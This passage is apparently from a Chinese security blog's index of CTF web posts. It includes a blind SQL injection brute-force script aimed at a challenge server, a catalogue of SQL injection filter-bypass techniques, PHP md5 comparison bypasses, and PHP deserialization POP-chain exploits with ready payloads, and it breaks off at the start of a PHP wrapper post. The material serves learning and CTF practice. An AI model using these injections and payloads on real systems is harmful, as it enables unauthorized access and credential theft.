用单反引号绕一半\nusername=1'||case+1E0when`password`regexp'^m52FPlDxYyLB.eIzAr!8gxh.$'then+1E0else~0E0+~0E0end||'0&amp;password=123\n\n写脚本爆破一下密码\nimport requests\nimport time\n\nsession = requests.session()\n\nburp0_url = \"http://47.107.231.226:30631/login\"\nburp0_headers = &#123;\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\",\n                 \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\",\n                 \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\",\n                 \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"http://47.107.231.226:30631\", \"Connection\": \"close\", \"Referer\": \"http://47.107.231.226:30631/\",\n                 \"Upgrade-Insecure-Requests\": \"1\"&#125;\n\nalphabet = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!.@%&amp;*&#123;&#125;[]_-^/\"\npassword = '^'\n\nwhile True:\n    for i in alphabet:\n        burp0_data = &#123;\"username\": f\"1'||case+1E0when`password`regexp'&#123;password + i&#125;'COLLATE'utf8mb4_bin'then+1E0else+!0E0+~0+!0E0end||'0\", \"password\": \"6878\"&#125;\n        r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)\n        if r.status_code == 401:\n            print(i)\n            password += i\n            break\n        time.sleep(0.3)\n    print(password)\n\n\n得到密码\nm52FPlDxYyLB.eIzAr!8gxh.\n\n由于sql语句中使用了regexp正则匹配所以得到的密码中的 . 是某个特殊字符，对这两个点爆破一下就行了。（同样这里也可以使用like）\n同时username使用万能密码&#39;or&#39;1&#39;or&#39;0绕过  (注意空格被过滤了, 单引号用于闭合)。\nbp爆破拿到flag。\n\n","categories":["SQL注入"],"tags":["SQL"]},{"title":"SQL注入绕过的简单总结","url":"/2022/03/18/sqlInjectSummary/","content":"新人web手对sql注入的一些简单总结\nSQL语法学习基础必学要打牢，首先要会SQL查询语句才能会SQL注入嘛，学习网站\n常用函数介绍\nCOUNT(column_name) 函数返回指定列的值的数目（NULL 不计入）：\n\nCOUNT() 函数返回表中的记录数：\n\n\n\nASCII(str) 返回值为字符串str  的最左字符的ASCII值。假如str为空字符串，则返回值为 0 。\nORD(char) 返回字符的 ASCII 值\nGROUP_CONCAT(expr) 该函数返回带有来自一个组的连接的非NULL值的字符串结果。即将expr的数据整合到一起。\nCHAR(ascii,…)将一个或多个ascii码( ,分隔)转为字符或字符串。\nCONCAT(str1,str2,…)  返回结果为连接参数产生的字符串。\nLENGTH(str) 返回值为字符串str 的长度，单位为字节。\n\n\nSUBSTR(str,start,len) 返回start开始，长度为len的字符串。注意:字符串起始位置为1。\n\nMID() 用法和上述一样。\n\nLEFT(str,len) 返回字符串str自最左边开始的len个字符。\n\nRIGHT(str,len)返回字符串str自最右边开始的len个字符。\n\nREVERSE(str) 反转字符串。\n\nIF(语句0,语句1,语句2)  若 语句0 为真则执行 语句1，否则执行语句2  \n\nLPAD(str,len,padstr) 返回字符串 str,  其左边由字符串padstr  填补到len  字符长度。假如str  的长度大于len, 则返回值被缩短至  len 字符。\n\nRPAD(str,len,padstr)返回字符串str, 其右边被字符串padstr填补至len字符长度。假如字符串str 的长度大于len,则返回值被缩短到与len 字符相同长度。\nmysql> SELECT LPAD('hi',4,'??');\n        -> '??hi'\nmysql> SELECT LPAD('hi',1,'??');\n        -> 'h'\n        \nmysql> SELECT RPAD('hi',5,'?');\n        -> 'hi???'\nmysql> SELECT RPAD('hi',1,'?');\n        -> 'h'\n\n\n\nsleep(duration) 睡眠(暂停) 时间为duration  参数给定的秒数，然后返回 0。\n\ndatabase() 获取当前数据库名。\n\n\n常用运算符和关键字\nunion用于联合查询  (注意:必须要有相同的字段数，注入时通常先用order by 测试下有几个字段)\n&#39;用于闭合语句\n不带引号的以  0X  开头的十六进制值在MYSQL中会被解释为对应的字符串。\n反引号 用于区分MYSQL的保留字与普通字符而引入的符号，如：\n\nSELECT`select`from`test`WHERE`select`='字段值';#未使用空格，是一种绕过方式\n\n\n不等于 !=  或&lt;&gt;，取非 ! 或not\n=  in  like  regexp !(语句&lt;&gt;语句)这几个关键字等价，如:\n\nselect * from myTable where id=1;\nselect * from myTable where id in (1);  #in后面参数必须加(),()中可匹配多个，用,分隔\nselect * from myTable where id like 1;  #like可加通配符%进行模糊匹配\nselect * from myTable where id regexp 1;#regexp可用于正则匹配\nselect * from myTable where !(id&lt;>1);\n\n这几个句子等价。\n\n比较运算符,大于小于号&gt; &lt; ，between A and B(A和B是参数)\n\ninformation_schema 在mysql中包含所有的数据库的相关信息，其中的information_schema.tables 和information_schema.columns 经常用到，（table_schema，table_name）和column_name分别是其字段名之一。table_schema是数据库名，table_name是表名，column_name是字段名。\n\n圆括号　(...)  使用括弧来规定表达式的运算顺序，例如：\nSELECT (1+2)*3;# 9\nselect(some_column)from(myTable)where(id=1);#未使用空格\n\n注释符 #    /**/\n\n与运算符 and    &amp;&amp;\n\n或运算符 or   ||\n\n异或运算符 ^   xor\n注意：如果在浏览器中地址栏输入要进行url编码,&amp; urlencode后为 %26  #为%23\n\nfrom num1 for num2  可用于substr(str,start,end)等 代替 ,如：\nsubstr(database(),1,1)\n等价于\nsubstr(database()from 1 for 1)\n\n常用绕过方法注释符号绕过常用的注释符有\n-- 注释内容\n# 注释内容\n/*注释内容*/\n;\n\n实例\nmysql> select * from users -- where id = 1;\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n1234567\nmysql> select * from users # where id = 2;\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n1234567\nmysql> select * from users where id = 3 /*+1*/\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | test3    | pass1    |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n大小写绕过常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。例如：waf过滤了关键字select，可以尝试使用Select等绕过。\nmysql> select * from users where id = -1 union select 1,2,3\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n#大小写绕过\nmysql> select * from users where id = -1 union Select 1,2,3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n\n内联注释绕过内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。\nmysql> select * from users where id = -1 union /*!select*/ 1,2,3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n\n双写关键字绕过在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。\n特殊编码绕过\n十六进制绕过\n\nmysql> select * from users where username = 0x7465737431;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nascii编码绕过Test 等价于CHAR(101,97,115,116)\n\n空格过滤绕过一般绕过空格过滤的方法有以下几种方法来取代空格\n/**/\n()\n回车(url编码中的%0a)\n` 反引号绕过\ntap\n两个空格\n\n实例\nmysql> select/**/*/**/from/**/users;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n|  3 | test3    | pass1    |\n+----+----------+----------+\n#注意括号中不能含有*\nmysql> select(id)from(users);\n+----+\n| id |\n+----+\n|  1 |\n|  3 |\n#回车符 %0a\nmysql> select\n    -> *\n    -> from \n    -> users\n    -> where \n    -> id = 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\nmysql> select`id`from`users`where`id`=1;\n+----+\n| id |\n+----+\n|  1 |\n+----+\n\n过滤or and xor not 绕过and = &amp;&amp;\nor = ||\nxor = | # 异或\nnot = !\n\n过滤等号&#x3D;绕过\n不加通配符的like执行的效果和=一致，所以可以用来绕过。\n\n正常加上通配符的like：\nmysql> select * from users where username like \"test%\";\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  3 | test3    | pass1    |\n+----+----------+----------+\n\n不加上通配符的like可以用来取代=：\nmysql> select * from users where id like 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nrlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样\n\nmysql> select * from users where id rlike 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nregexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配\n\nmysql> select * from users where id regexp 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\n使用大小于号来绕过\n\nmysql> select * from users where id > 1 and id &lt; 3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  2 | user2    | pass1    |\n+----+----------+----------+\n\n\n&lt;&gt; 等价于 !&#x3D;所以在前面再加一个!结果就是等号了\n\nmysql> select * from users where !(id &lt;> 1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> select * from users where id = 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的过滤大小于号绕过\n过滤大小于号绕过在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过\n\ngreatest(n1, n2, n3…):返回n中的最大值\n\nmysql> select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nleast(n1,n2,n3…):返回n中的最小值\nstrcmp(str1,str2):若所有的字符串均相同，则返回  0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1\n\nmysql> select * from users where id = 1 and !strcmp(ascii(substr(username,1,1)),116);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> select * from users where id = 1 and !strcmp(ascii(substr(username,1,1)),117);\nEmpty set (0.00 sec)\n\n\nin关键字\n\nmysql> select * from users where id = 1 and substr(username,1,1) in ('t');\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.01 sec)\n\nmysql> select * from users where id = 1 and substr(username,1,1) in ('y');\nEmpty set (0.00 sec)\n\n\nbetween a and b:范围在a-b之间\n\nmysql> select * from users where id between 1 and 2;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n+----+----------+----------+\n2 rows in set (0.00 sec)\n\nmysql> select * from users where id = 1 and substr(username,1,1) between 'a' and 'b';\nEmpty set (0.00 sec)\n\nmysql> select * from users where id = 1 and substr(username,1,1) between 'a' and 't';\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n使用between a and b判等\nmysql> select * from users where id = 1 and substr(username,1,1) between 't' and 't';\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n过滤引号绕过\n使用十六进制\n\nselect column_name  from information_schema.tables where table_name=0x7573657273;\n1\n\n\n宽字节\n\n常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。\n# 过滤单引号时\n%bf%27 %df%27 %aa%27\n12\n%df\\’ &#x3D; %df%5c%27&#x3D;縗’\n1\n\n过滤逗号绕过如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串例如在substr()等函数中，常规的写法是\nmysql> select substr(\"string\",1,3);\n+----------------------+\n| substr(\"string\",1,3) |\n+----------------------+\n| str                  |\n+----------------------+\n\n\n如果过滤了逗号，可以这样使用from pos for len来取代\n\nmysql> select substr(\"string\" from 1 for 3);\n+-------------------------------+\n| substr(\"string\" from 1 for 3) |\n+-------------------------------+\n| str                           |\n+-------------------------------+\n1 row in set (0.00 sec)\n\n在sql盲注中，如果过滤逗号，以下参考下面的写法绕过\nmysql> select ascii(substr(database() from 1 for 1)) > 120;\n+----------------------------------------------+\n| ascii(substr(database() from 1 for 1)) > 120 |\n+----------------------------------------------+\n|                                            0 |\n+----------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(substr(database() from 1 for 1)) > 110;\n+----------------------------------------------+\n| ascii(substr(database() from 1 for 1)) > 110 |\n+----------------------------------------------+\n|                                            1 |\n+----------------------------------------------+\n\n\n也可使用join关键字来绕过\n\nmysql> select * from users union select * from (select 1)a join (select 2)b join(select 3)c;\n#像(select 1)a是子查询，嵌套查询的时候子查询出来的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名。a是别名。\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n|  3 | test3    | pass1    |\n|  1 | 2        | 3        |\n+----+----------+----------+\n\n其中的\nunion select * from (select 1)a join (select 2)b join(select 3)c\n\n等价于\nunion select 1,2,3\n\n\n使用like关键字适用于substr()等提取子串的函数中的逗号\n\nmysql> select ascii(substr(user(),1,1))=114;\n+-------------------------------+\n| ascii(substr(user(),1,1))=114 |\n+-------------------------------+\n|                             1 |\n+-------------------------------+\n\nmysql> select user() like \"r%\";\n+------------------+\n| user() like \"r%\" |\n+------------------+\n|                1 |\n+------------------+\n\nmysql> select user() like \"t%\";\n+------------------+\n| user() like \"t%\" |\n+------------------+\n|                0 |\n+------------------+\n\n\n使用offset关键字适用于limit中的逗号被过滤的情况limit 2,1等价于limit 1 offset 2\n\nmysql> select * from users limit 2,1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | test3    | pass1    |\n+----+----------+----------+\n\nmysql> select * from users limit 1 offset 2;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | test3    | pass1    |\n+----+----------+----------+\n12345678910111213\n\n过滤函数绕过\nsleep() –&gt;benchmark()\n\nmysql> select 12,23 and sleep(1);\n+----+-----------------+\n| 12 | 23 and sleep(1) |\n+----+-----------------+\n| 12 |               0 |\n+----+-----------------+\n1 row in set (1.00 sec)\n# MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 \n参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式\nmysql> select 12,23 and benchmark(1000000000,1);\n+----+--------------------------------+\n| 12 | 23 and benchmark(1000000000,1) |\n+----+--------------------------------+\n| 12 |                              0 |\n+----+--------------------------------+\n1 row in set (4.61 sec)\n\n\nascii()–&gt;hex()、bin()替代之后再使用对应的进制转string即可\ngroup_concat()–&gt;concat_ws()\n\nmysql> select group_concat(\"str1\",\"str2\");\n+-----------------------------+\n| group_concat(\"str1\",\"str2\") |\n+-----------------------------+\n| str1str2                    |\n+-----------------------------+\n1 row in set (0.00 sec)\n\n#第一个参数为分隔符\nmysql> select concat_ws(\",\",\"str1\",\"str2\");\n+------------------------------+\n| concat_ws(\",\",\"str1\",\"str2\") |\n+------------------------------+\n| str1,str2                    |\n+------------------------------+\n\n\nsubstr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()\nsubstr(str,start,1) 等价于 right(left(str,len),1)     ，同样还可以使用left(),right(),reverse()进行组合绕过，同样用正则regexp匹配字符串有奇效，如  regexp &#39;^flag&#39;可以匹配以flag开头的字符串，具体用法请学习正则表达式。\nord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。\n\n","categories":["SQL注入"],"tags":["SQL","SQL注入绕过"]},{"title":"关于md5的绕过技巧","url":"/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/","content":"MD5函数介绍\n语法\n​         md5(string,raw)\n\n\n\n参数\n描述\n\n\n\nstring\n必需。要计算的字符串。\n\n\nraw\n可选。默认不写为FALSE：32位16进制的字符串。TRUE：16位原始二进制格式的字符串\n\n\n\n\nMD5函数漏洞$str1 = $_GET['str1'];\n$str2 = $_GET['str2'];\nif (md5($str1) == md5($str2))&#123;\n\techo 'OK'; \n&#125;\n\n\nphp弱类型比较产生的漏洞\n想要满足这个判断只需要构造出MD5值为0e开头的字符串，这样的话弱类型比较会认为是科学技术法，0的多少次方都是0，因此可以绕过\n\n\n有一些字符串的MD5值为0e开头，这里记录一下\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\n\n\n还有MD5和双MD5以后的值都是0e开头的\nCbDLytmyGm2xQyaLNhWn\n770hQgrBOjrcqftrlaZk\n7r4lGXCH2Ksu2JNT3BYM\n\n\n\nPHP特性$str1 = $_GET['str1'];\n$str2 = $_GET['str2'];\nif (md5($str1) === md5($str2)) &#123;\n\techo 'OK';\n&#125;\n\n\n因为是强类型比较，用0e开头的字符串是没办法绕过的了，但是PHP自身的特性使得可以提交一个数组，而md5函数传入数组的返回值都是NULL，这样就可以绕过强类型比较了。所以这里用GET传入\n?str1[]&#x3D;1&amp;str2[]&#x3D;2就行了\n\n补充：md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$str1和$str2都是数组则双双返回FALSE, 两个FALSE相等得以绕过\n\n\n\nMD5碰撞$str1 = (string)$_GET['str1'];\n$str2 = (string)$_GET['str2'];\nif (md5($str1) === md5($str2)) &#123;\n\techo 'OK';\n&#125;\n\n\n由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll（工具下载）就可以了\n\n绕过md5()来构造攻击语句select * from 'admin' where password=md5($pass,true)\n\n\nffifdyop\n这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c   (对应ascii字符串&#39;or&#39;6É]é!r,ùíb\u001c)，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数\n\n\n\n","categories":["web安全基础"],"tags":["php","MD5"]},{"title":"php反序列化漏洞简单总结","url":"/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/","content":"什么是序列化与反序列化​    这其实是为了解决 PHP 对象传递的一个问题,因为 PHP  文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦。\n序列化演示&lt;?php\n\nclass test&#123;\n\n    public $name = 'name';  \n\n    private $sex = 'sex';  \n\n    protected $age = '20';\n\n&#125;\n\n$test1 = new test();\n\n$object = serialize($test1);\n\necho $object;\n\n?>\n\n其输出结果为\nO:4:\"test\":3:&#123;s:4:\"name\";s:4:\"name\";s:9:\"testsex\";s:3:\"sex\";s:6:\"*age\";s:2:\"20\";&#125;\n\n序列化就是将原有的对象转换为一个字符串\n这个字符串中存储这对象的信息，在需要的时候只需再将这串字符串反序列化就能得到对应的类对象。\n这里关键函数serialize()将对象序列化\n有几个要点\n\nprivate属性序列化的时候格式是 %00类名%00成员名\nprotected属性序列化的时候格式是 %00*%00成员名\n\n注意：\n\n一般做题时应当直接将序列化后的字符串进行urlencode，如果直接打印在浏览器上其中的%00不会显示，手动复制是没有 %00的。\n序列化只序列化属性不序列化方法(函数)。\n\n反序列化演示&lt;?php\n\nclass test&#123;\n\n    public $name = 'name';  \n\n    private $sex = 'sex';  \n\n    protected $age = '20';\n\n&#125;\n\n$test1 = new test();\n\n$object = serialize($test1);//序列化对象\n\necho $object;\n\n\n$newObj = unserialize($object);//反序列化\n\nvar_dump($newObj)\n\n?>\n\n运行得到\n\n注意：\n(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在\n​    这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。\n(2)我们在反序列化攻击的时候也就是依托类属性进行攻击\n​    我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击\n如何利用反序列化进行攻击前提条件：\n\n必须有unserialize()方法\n作用域下有相应的类存在且类中存在魔术方法\n\n由于序列化和反序列化只对类中的属性有效，并不会对方法生效。所以php魔术方法就成了关键。\n什么是魔术方法​    php 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以  __ 为前缀。 魔术方法不需要人为调用，它会在特定条件下自动调用。\n​    常见的魔术方法如下：\n__construct()//类的构造函数，创建类对象时调用\n\n__destruct()//类的析构函数，对象销毁时调用\n\n__call()//在对象中调用一个不可访问方法时调用\n\n__callStatic()//用静态方式中调用一个不可访问方法时调用\n\n__get()//获得一个类的成员变量时调用\n\n__set()//设置一个类的成员变量时调用\n\n__isset()//当对不可访问属性调用isset()或empty()时调用\n\n__unset()//当对不可访问属性调用unset()时被调用。\n\n__sleep()//执行serialize()时，先会调用这个函数\n\n__wakeup()//执行unserialize()时，先会调用这个函数\n\n__toString()//类被当成字符串时的回应方法\n\n__invoke()//调用函数的方式调用一个对象时的回应方法\n\n__set_state()//调用var_export()导出类时，此静态方法会被调用。\n\n__clone()//当对象复制完成时调用\n\n__autoload()//尝试加载未定义的类\n\n__debugInfo()//打印所需调试信息\n\n重点说明：\n\n__construct()：当对象创建时会自动调用(在unserialize()结束后调用)\n__wakeup() ：unserialize()时会自动调用\n__destruct()：当对象被销毁时会自动调用\n__toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用。例如执行                   echo new test();其就会自动调用对象中的__toStrong()方法\n__get() :当从不可访问的属性读取数据。例如从对象外部访问由private和protect修饰的属性，就会调用该方法，其中传递的形参为访问属性的属性名\n\nps：上述用法说明不全，使用时应参考相应文档\n简单的案例题目链接\n打开审计源码\n&lt;?php\nclass example &#123;\n    public $str;\n    public function __toString()\n    &#123;\n        \n        return $this->str->flag;\n    &#125;\n&#125;\n\nclass get &#123;\n    private $flag;\n    public function __get($name)\n    &#123;\n        include($name.$this->flag);\n        return $flag;//flag in flag.php\n    &#125;\n&#125;\n\nif(isset($_GET['a'])) &#123;\n    $a = unserialize($_GET['a']);\n    \n    echo $a;\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n\n\n这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现  __toStrong() 方法，而又存在 echo $a 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 return $this-&gt;str-&gt;flag时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。之后要 include &#39;flag.php&#39;，由于$name &#x3D;&#x3D; flag，所以要构造 $flag &#x3D;&#x3D; ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。\n即\n&lt;?php\nclass example &#123;\n    public $str;\n&#125;\nclass get &#123;\n    private $flag;\n    function __construct($flag)\n    &#123;\n        $this->flag = $flag;\n    &#125;\n&#125;\n$a = new example();\n$b = new get('.php');\n$a->str = $b;\necho urlencode(serialize($a));\n\n运行得到payload\nO%3A7%3A%22example%22%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A3%3A%22get%22%3A1%3A%7Bs%3A9%3A%22%00get%00flag%22%3Bs%3A4%3A%22.php%22%3B%7D%7D\n\n​    对这道题的简单简单的总结：首先必需要了解php在反序列化中这几个魔术方法的用法，如果连这个都不知道的话基本就没法做。另外要了解面向对象的这种编程思想，注意对象在其中的各种应用。类似的其他的php反序列化的题目基本上也都是相同的思路，明白如何通过已知的代码将各对象之间联系起来。\n例题ctfshow卷王杯 web1 easy unserialize\n审计源码\n&lt;?php\nclass one &#123;\n    public $object;\n\n    public function MeMeMe() &#123;\n        array_walk($this, function($fn, $prev)&#123;\n            if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") &#123;\n                include('flag.php');\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n\n    public function __destruct() &#123;\n        @$this->object->add();\n    &#125;\n\n    public function __toString() &#123;\n        return $this->object->string;\n    &#125;\n&#125;\n\nclass second &#123;\n    protected $filename;\n\n    protected function addMe() &#123;\n        return \"Wow you have sovled\".$this->filename;\n    &#125;\n\n    public function __call($func, $args) &#123;\n        call_user_func([$this, $func.\"Me\"], $args);\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n\n    public function __get($name) &#123;\n        $var = $this->$name;\n        $var[$name]();\n    &#125;\n&#125;\n\nif (isset($_GET[\"payload\"])) &#123;\n    unserialize($_GET['payload']);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n​    这里基本的魔术方法就不再解释了，重点说一下这几个不常见的。\n​    这里首先解释一下 array_walk()这个函数。这个函数在当前题目的形式是 array_walk($array, function($value, $key) &#123;&#125;) ，这个函数可以将目标数组中的每一个元素给后面参数中的函数来处理，这里 $array 是一个数组 或一个类对象（其可以看作是一个数组，其中的属性为数组中的键值对）。后面的匿名函数第一个参数为数组（对象）中的 “值”（属性值），第二个参数为数组（对象）中的 “键”（属性名）。\n​    后面 __call($func, $args) 函数是在调用对象中不存在的方法时会自动调用，参数 $func 是所调用函数的函数名， $args 是对应函数的参数。 call_user_func([$this, $func], $args) 方法是调用对象中具体函数的一种方法，[]中第一个参数是对象，第二个参数为对象中需要调用的函数的函数名（字符串格式）,$args 参数是所调用函数中的参数。\n​    __get($name) 函数是当从外部访问类中的私有属性的时候会自动调用，参数 $name 是所访问的属性名。\n​    同时要知道在 php 中调用类中的函数还有一种不常用的方法，如下\n&lt;?php\n\nclass test &#123;\n    public function testFunc() &#123;\n        echo 'test success!!!';\n        echo '&lt;br/>调用了函数testFunc()';\n    &#125;\n&#125;\n$obj = new test();\n[$obj, 'testFunc']();//调用obj对象中的 testFunc()\n\n运行结果如下\n\n这一点用在了上面例题的  $var[$name]();\n​    把该解释的都解释了，那接下来就说说这题怎么去做。这题其实还是有点复杂的，就借一张图来说吧。\n\n对应代码\n&lt;?php\nclass one &#123;\n    public $object;\n&#125;\n\nclass second &#123;\n    protected $filename;\n    public function __construct($filename)&#123;\n        $this->filename=$filename;\n    &#125;\n&#125;\n\nclass third &#123;\n    private $string;\n\n    public function __construct($string) &#123;\n        $this->string = $string;\n    &#125;\n&#125;\n\n$obj1 = new one();\n$obj2 = new one();\n$obj3 = new one();\n$obj3->year_parm = ['Happy_func'];\n$obj2->object = new third(['string'=>[$obj3,'MeMeMe']]);\n$obj1->object =  new second($obj2);\n\n$payload = serialize($obj1);\n\necho urlencode($payload);\n\n运行得到payload\nO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7D\n\n","categories":["web安全基础"],"tags":["php","反序列化"]},{"title":"php伪协议简单总结","url":"/2022/03/01/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/","content":"简介首先来看一下有哪些文件包含函数：\ninclude()、require()、include_once()、require_once()、highlight_file()\nshow_source() 、readfile() 、file_get_contents() 、fopen() 、file()\n\n\n\n有哪些伪协议：\nfile:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 